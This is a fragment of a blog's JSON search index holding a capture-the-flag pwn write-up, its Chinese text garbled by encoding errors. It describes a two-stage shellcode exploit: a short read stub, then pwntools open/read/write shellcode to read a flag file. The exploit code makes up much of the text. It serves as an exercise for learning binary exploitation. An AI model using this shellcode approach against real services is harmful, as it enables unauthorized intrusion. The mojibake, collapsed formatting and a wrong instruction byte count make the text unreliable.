execveat\nåœ¨mainå‡½æ•°å¯ä»¥çœ‹åˆ°åªèƒ½è¾“å…¥0x10ä¸ªå­—ç¬¦ï¼Œè¿™ä¸ªé•¿åº¦æ— æ³•æ„å»ºshellcode\næ‰€ä»¥è°ƒç”¨ä¸€ä¸ªé•¿åº¦è¶³å¤Ÿçš„readå‡½æ•°è¯»å…¥(12ä¸ªå­—èŠ‚)\nreadçš„ä¸‰ä¸ªå‚æ•°ã€‚rdiæ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œrsiæ˜¯å†™å…¥ä½ç½®ï¼Œrdxæ˜¯å†™å…¥é•¿åº¦\nrdxæ‰§è¡Œreadçš„æ—¶å€™æ˜¯0x10\n\nä½†æ˜¯å½“ä»–è¿è¡Œåˆ°è°ƒç”¨bufçš„æ—¶å€™ï¼Œrdxçš„æ•°å€¼æ˜¯bufçš„åœ°å€\n\nxor rdi, rdiï¼š1 å­—èŠ‚ (\\x48\\x31\\xff)mov rsi, rdxï¼š3 å­—èŠ‚ (\\x48\\x89\\xd6)add rsi, 0xcï¼š3 å­—èŠ‚ (\\x48\\x83\\xc6\\x0c)syscallï¼š2 å­—èŠ‚ (\\x0f\\x05)\n\nç„¶åå°±å¯ä»¥å¯¹flagæ–‡ä»¶è¿›è¡Œæ“ä½œ\nè„šæœ¬\nfrom pwn import *context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)#io = remote(&quot;node5.anna.nssctf.cn&quot;, 21185)io = process(&quot;./vuln&quot;)elf = ELF(&quot;./vuln&quot;)gdb.attach(io)io.recvuntil(b&quot;shellcode:\\n&quot;)read_code = &quot;&quot;&quot;xor rdi, rdimov rsi, rdxadd rsi, 0xcsyscall&quot;&quot;&quot;io.send(asm(read_code))shellcode = shellcraft.open(&#x27;./flag&#x27;)shellcode += shellcraft.read(3, 0xCAFE0000 + 0x100, 0x100)shellcode += shellcraft.write(1, 0xCAFE0000 + 0x100, 0x100)io.sendline(asm(shellcode))io.interactive()\n\n\n\n","categories":["exercise_pwn"],"tags":["PWN","orw","code"]},{"title":"[NSSRound#14 Basic]rbp","url":"/2025/09/01/NSSRound-14-Basic-rbp/","content":"","categories":["exercise_pwn"],"tags":["PWN"]}]